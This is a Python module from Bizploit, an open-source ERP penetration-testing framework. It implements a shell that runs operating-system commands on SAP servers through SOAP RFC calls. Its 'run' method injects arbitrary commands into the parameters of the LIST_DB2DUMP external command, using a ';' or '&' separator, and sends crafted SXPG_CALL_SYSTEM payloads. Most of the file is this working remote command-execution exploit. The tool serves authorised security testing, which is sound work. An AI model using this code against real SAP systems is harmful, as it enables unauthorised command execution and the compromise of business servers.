# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Sergio Abraham <sabraham@onapsis.com>    
    
Copyright 2012 ONAPSIS Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''
from core.exceptions.bizploitException import bizploitException
from fwk.shells.baseShell import baseShell
import re
import xml.dom.minidom as xmllib

class SOAPCallSystemShell(baseShell):
	'''
	Run operating system commands through SOAP RFC.
	'''
	def __init__( self ):
		baseShell.__init__(self)
		self._menu = {'run':self._run,'runExt':self._runExt}
		self._cmdInter = ''
		
	def _onStart(self):
		self._om.console(self,'SOAPCallSystemShell - OS Commanding through SOAP RFC Calls')
		# Target information
		self.showTargetInfo()
	
	def getTargetInfo(self):
		'''
		Get information about the target first, if available.
		'''
		# Check if we have the connection from the KB
		sysinfo = self._kb.getData(self._connector, 'sapICMSoapRFC')
		if sysinfo:
			# We need the raw data
			try:
				sysinfo = sysinfo.getData('sapICMSoapRFC')
			except:
				sysinfo = {}
		else:
			# Let's try to get the information from the connection itself.
			if self._connector.getConn():
				# Information is got from the connection itself
				sysinfo = self._connector.getConn().sapinfo()
				
		data = {}		

		# Assume UNIX as default.
		data['guessed'] = True
		data['OS'] = 'UNIX'
		data['OSFlavour'] = 'UNIX'
		data['tmpDir'] = '/tmp/'
		data['cmdInterpreter'] = '/bin/sh'
		data['cmdInterpreterParams'] = '-c'
		data['cmdSeparator'] = ';'
		
		if len(sysinfo) != 0:
			data['guessed'] = False
			os = sysinfo['Operating System']
			if re.search('Win', os):
				# If it was Windows, update the result data.
				data['OS'] = os
				data['OSFlavour'] = 'Windows NT'
				data['tmpDir'] = 'c:\\Temp\\'
				data['cmdInterpreter'] = 'cmd.exe'
				data['cmdInterpreterParams'] = '/c'
				data['cmdSeparator'] = '&amp;'				
			else:
				data['OS'] = os.strip()
			
		self._info = data
			
		return data

	def showTargetInfo(self):
		'''
		Get the target information to see which is the best way to interact with it.
		'''
		# Target information
		self._info = self.getTargetInfo()
		
		if self._info['guessed']:
			self._om.information(self, 'There is no information about the current target. Assuming default: ' + self._info['OSFlavour'])
			self._om.information(self, 'The safest command to use under this circumstances is: \'runRaw\'. The \'run\' command may not work.')
		else:
			self._om.information(self,'The remote target OS is: ' + self._info['OS'] + '.')
			if self._info['OS'] == 'Linux' or self._info['OS'] == 'UNIX':
				self._om.information(self, 'The "run" command does not work on Unix/Linux. Use the runExt command instead.')
	
	def _run_SAPICM(self, parameters):
		'''
		Calls SXPG_COMMAND_EXECUTE to run commands in SAP R/3 servers through SOAP.
		It automatically detects remote operating system.			
		'''
		if len(parameters) < 1:
			self._parent._cmd_help(['run'])
			return

		cmd = ' '.join(parameters)
		
		cmdExists, os = self._checkExtCmdExists('LIST_DB2DUMP',  cmd)
		
		if cmdExists:
			cmdToRun = self._info['cmdSeparator'] + cmd
	
			#<OPERATINGSYSTEM>''' + self._info['OS'] + '''</OPERATINGSYSTEM>
			payload = '''<?xml version="1.0" encoding="utf-8" ?>
	<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<env:Body>
	<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
		<COMMANDNAME>LIST_DB2DUMP</COMMANDNAME>		
		<ADDITIONAL_PARAMETERS>''' + cmdToRun +'''</ADDITIONAL_PARAMETERS>
		<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>
	</n1:SXPG_CALL_SYSTEM>
	</env:Body>
	</env:Envelope>'''
	
			try:
				soapurl = self._connector.getBasePath() + '/sap/bc/soap/rfc?sap-client=' + self._connector.getClient() + '&sap-language=EN'
				res = self._connector.doPOST(soapurl, okCodes=[200,500], data = payload)
				response = res.read()
				print self.formatOutput(response)
					
			except bizploitException:
				self._om.information(self,'Could not run command.')
				return
		else:
			self._om.information(self, 'External command \'LIST_DB2DUMP\' does not exist. Could not run command.')
		
		return
	
	def _runExt_SAPICM(self, parameters):
		'''
		Calls SXPG_COMMAND_EXECUTE to run external commands in SAP R/3 servers.
		Does not perform command injection, just uses available SAP external commands.
		'''
		params = ''
		if len(parameters) < 1:
			self._parent._cmd_help(['runExt'])
			return
			
		cmd_name = parameters[0]
		if len(parameters) > 1:
			params = ' '.join(parameters[1:])
		
		cmdExists,  os = self._checkExtCmdExists(cmd_name,  params)
				
		if cmdExists:
			#<OPERATINGSYSTEM>''' + os + '''</OPERATINGSYSTEM>
			payload = '''<?xml version="1.0" encoding="utf-8" ?>
	<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<env:Body>
	<n1:SXPG_CALL_SYSTEM xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
		<COMMANDNAME>''' + cmd_name + '''</COMMANDNAME>
		<ADDITIONAL_PARAMETERS>''' + params +'''</ADDITIONAL_PARAMETERS>
		<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>
	</n1:SXPG_CALL_SYSTEM>
	</env:Body>
	</env:Envelope>'''
	
			try:
				soapurl = self._connector.getBasePath() + '/sap/bc/soap/rfc?sap-client=' + self._connector.getClient() + '&sap-language=EN'
				res = self._connector.doPOST(soapurl, okCodes=[200,500], data = payload)
				response = res.read()
				print self.formatOutput(response)
					
			except bizploitException:
				self._om.information(self,'Could not run command.')
				return
		else:
			self._om.information(self,'External command "' + cmd_name + '" does not exist.')
	
	def _checkExtCmdExists(self,  cmdName,  params,  os=None):
		'''
		Check if the specified external os command exists in the target system.
		If it was possible to identify the remote OS, the method will check if the selected command exists for that OS or 'ANYOS'.
		If it was not possible to id the remote OS, the method will check against the specified OS and 'ANYOS'
		
		@return: Returns a tuple with (boolean for command existence, available OS if exists)
		'''
		# Analyze target OS
		osToCheck = []
		if os != None:
			osToCheck = [os]
		else:
			try:
				osToCheck = [self._info['OSFlavour']]
			except:
				self._om.debug(self,  'Could not get OS info.')				
		
		# Always check for ANYOS at the end.
		osToCheck.append('ANYOS')
		
		# If we don't set a value, the library won't send it!
		if len(params) == 0:
			params = 'foo'
		
		# Check if the external commands exists, maybe its for ANYOS
		for os in osToCheck:
			payload = '''<?xml version="1.0" encoding="utf-8" ?>
<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<env:Body>
<n1:SXPG_COMMAND_CHECK xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
	<COMMANDNAME>''' + cmdName + '''</COMMANDNAME>
	<OPERATINGSYSTEM>''' + os + '''</OPERATINGSYSTEM>
	<ADDITIONAL_PARAMETERS>''' + params + '''</ADDITIONAL_PARAMETERS>
</n1:SXPG_COMMAND_CHECK>
</env:Body>
</env:Envelope>'''

			try:
				soapurl = self._connector.getBasePath() + '/sap/bc/soap/rfc?sap-client=' + self._connector.getClient() + '&sap-language=EN'
				res = self._connector.doPOST(soapurl, okCodes=[200,500], data = payload)
				return (True,  os)
			except bizploitException:
				pass
		return (False,  '')

	def formatOutput(self, response):
		'''
		Formats output for SOAP response
		'''
		data = xmllib.parseString(response)
		res = []
		for item in data.getElementsByTagName('item'):
			if item.getElementsByTagName('LENGTH')[0].childNodes and \
			int(item.getElementsByTagName('LENGTH')[0].childNodes[0].data) > 0:
				res.append(str(item.getElementsByTagName('MESSAGE')[0].childNodes[0].data))
		ret = '\t' + '\n\t'.join(res)
		return ret